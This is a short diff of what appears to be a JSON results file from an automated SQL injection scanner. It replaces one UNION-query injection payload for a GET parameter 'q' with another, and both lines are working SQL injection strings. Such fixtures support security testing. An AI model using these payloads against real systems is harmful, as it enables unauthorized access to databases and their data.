@@ -36,7 +36,7 @@
       "place": "GET",
       "technique": "UNION query",
       "title": "Generic UNION query (NULL) - 10 columns",
-      "payload": "q=')) UNION ALL SELECT CONCAT(CONCAT('qbpjq','DQDNkxShHkEtAhdUfllaVQWzDfTRfmTOCzRHDozt'),'qxzzq'),13,13,13,13,13,13,13,13,13-- wmkj"
+      "payload": "q=')) UNION ALL SELECT 79,79,79,79,79,CONCAT(CONCAT('qjjbq','MCBrCgPXAGgEAMkCujcDYxmngnRxywxrFdErwWAv'),'qbxxq'),79,79,79,79-- lKkX"
     }
   ],
   "errors": [],
